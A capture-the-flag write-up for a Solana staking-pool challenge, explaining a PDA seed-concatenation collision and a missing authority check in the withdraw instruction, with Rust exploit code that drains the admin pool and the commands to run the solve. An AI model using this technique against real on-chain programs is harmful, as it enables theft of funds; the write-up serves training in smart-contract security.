# Staking Pool

**Category:** Blockchain  **Difficulty:** Medium  **Author:** Abu

> You've discovered H7Corp's employee staking pool program. The admin pool contains 100 SOL, but only employees with admin privileges should be able to access it. Can you find a way to steal the funds?

Handout: `pool.tar.gz`. Run: `cd challenge && docker compose up --build`, port 5001. You start with 10 SOL and need 50.

## Solution

Pools live at a PDA derived from two strings glued together with no separator:

```rust
Pubkey::find_program_address(&[b"POOL", org.as_bytes(), emp.as_bytes()], program_id)
```

So `"H7Cor" + "padmin"` and `"H7Corp" + "admin"` hash to the same address. That's the bug the challenge is built around.

When you actually read `withdraw`, it's worse than that. It checks that the user signed and that the pool is owned by the program, and that's it. Nobody checks that the signer is the pool's authority. So you don't even need the collision. Pass the admin pool PDA the server prints and withdraw from it:

```rust
let mut data = vec![2u8];                          // Withdraw
data.extend_from_slice(&50_000_000_000u64.to_le_bytes());
invoke(&Instruction {
    program_id: *staking_program.key,
    accounts: vec![AccountMeta::new(*admin_pool.key, false),
                   AccountMeta::new(*user.key, true)],
    data,
}, &[admin_pool.clone(), user.clone()])?;
```

```
cd solve && cargo build-sbf && cd ..
python3 solve.py <host> 5001
```

Flag: dynamic per container, `H7CTF{pda_s33d_c0ll1s10n_unlocks_admin_p00l_<uuid>}`
